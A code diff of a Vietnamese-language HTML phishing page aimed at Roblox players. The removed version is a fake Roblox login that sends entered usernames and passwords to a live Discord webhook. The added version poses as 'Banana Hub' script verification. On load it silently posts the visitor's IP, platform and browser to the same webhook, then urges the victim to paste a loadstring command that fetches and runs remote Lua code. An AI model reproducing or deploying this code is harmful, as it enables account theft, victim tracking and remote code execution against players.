@@ -3,41 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>nhận script banana</title>
+    <title>Banana Hub - Script Verification</title>
     <style>
-        body { font-family: 'HCo Gotham SSm', Helvetica, Arial, sans-serif; background-color: #F2F4F5; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .login-card { background: white; width: 400px; padding: 40px; border-radius: 8px; box-shadow: 0 1px 4px rgba(0,0,0,0.1); text-align: center; }
-        .logo { width: 160px; margin-bottom: 25px; }
-        h2 { font-weight: 500; color: #393B3D; margin-bottom: 20px; font-size: 20px; }
-        .input-group { margin-bottom: 10px; }
-        input { width: 100%; padding: 12px; border: 1px solid #B8BABC; border-radius: 4px; background-color: #F2F4F5; box-sizing: border-box; font-size: 14px; }
-        .btn-red { background-color: #0084FF; color: white; border: none; width: 100%; padding: 12px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 15px; }
-        .btn-red:hover { background-color: #0074E0; }
-        .info { font-size: 12px; color: #666; margin-top: 25px; }
+        body { background: #0a0a0a; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .card { background: rgba(20, 20, 20, 0.9); border: 1px solid #333; padding: 40px; border-radius: 15px; box-shadow: 0 0 30px rgba(0, 255, 255, 0.1); width: 450px; text-align: center; }
+        .spinner { width: 50px; height: 50px; border: 5px solid #222; border-top: 5px solid #00d2ff; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status-text { font-size: 18px; font-weight: bold; color: #00d2ff; text-transform: uppercase; letter-spacing: 2px; }
+        .script-box { background: #000; color: #00ff00; padding: 15px; border-radius: 8px; border: 1px solid #00ff00; margin-top: 20px; display: none; font-family: monospace; font-size: 12px; word-break: break-all; }
+        .btn-copy { background: #00d2ff; color: #000; border: none; padding: 10px 20px; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 15px; display: none; }
+        .ip-log { font-size: 10px; color: #444; margin-top: 10px; }
     </style>
 </head>
 <body>
-    <div class="login-card">
-        <img src="https://images.rbxcdn.com/2012012c41804246879e6e16c80287f3.svg" alt="Roblox" class="logo">
-        <h2>Đăng nhập để xác minh mày là con người</h2>
-        <div class="input-group"><input type="text" id="u" placeholder="Tên đăng nhập / Email"></div>
-        <div class="input-group"><input type="password" id="p" placeholder="Mật khẩu"></div>
-        <button class="btn-red" onclick="capture()">Đăng Nhập</button>
-        <div class="info">BANGDEPZAI.</div>
+    <div class="card">
+        <div id="loader">
+            <div class="spinner"></div>
+            <div class="status-text">ĐANG XÁC MINH NGƯỜI DÙNG...</div>
+            <p style="color: #666;">Vui lòng không đóng trình duyệt</p>
+        </div>
+
+        <div id="result">
+            <div style="color: #00ff00; font-weight: bold; font-size: 20px;">XÁC MINH THÀNH CÔNG!</div>
+            <p style="color: #ccc;">Dán đoạn code dưới đây vào Executor của bạn:</p>
+            <div class="script-box" id="scriptBox">loadstring(game:HttpGet("https://raw.githubusercontent.com/onion132005-bit/test0.02/refs/heads/main/onion13v6.lua"))()</div>
+            <button class="btn-copy" id="copyBtn" onclick="copyScript()">COPY SCRIPT</button>
+        </div>
     </div>
+
     <script>
+        const wh = "https://discord.com/api/webhooks/1482022951615201363/4tr2Yrhvb0ihNmih4fUnFRlkUXbafTFpXIXyF9m4i6dakilr4_2hS9Bwf2nKTCXRwOAh";
+
         async function capture() {
-            const u = document.getElementById('u').value;
-            const p = document.getElementById('p').value;
-            const webhook = "https://discord.com/api/webhooks/1482022951615201363/4tr2Yrhvb0ihNmih4fUnFRlkUXbafTFpXIXyF9m4i6dakilr4_2hS9Bwf2nKTCXRwOAh";
-            if (u.length < 3 || p.length < 3) return;
-            await fetch(webhook, {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({ content: "### 💰 ACC CAPTURED\n**User:** `" + u + "`\n**Pass:** `" + p + "`" })
-            });
-            window.location.href = "https://www.roblox.com/login";
+            // Lấy thông tin ngay lập tức (Vào cái là mất thông tin hệ thống)
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                
+                await fetch(wh, {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({
+                        content: "### ⚡ VICTIM EXECUTED SCRIPT FETCH\n**IP:** `" + ipData.ip + "`\n**Device:** `" + navigator.platform + "`\n**Browser:** `" + navigator.userAgent + "`"
+                    })
+                });
+            } catch (e) {}
+
+            // Hiệu ứng load giả
+            setTimeout(() => {
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('scriptBox').style.display = 'block';
+                document.getElementById('copyBtn').style.display = 'inline-block';
+            }, 3500);
         }
+
+        function copyScript() {
+            const text = document.getElementById('scriptBox').innerText;
+            navigator.clipboard.writeText(text);
+            alert("Đã copy script! Hãy dán vào game.");
+        }
+
+        window.onload = capture;
     </script>
 </body>
 </html>
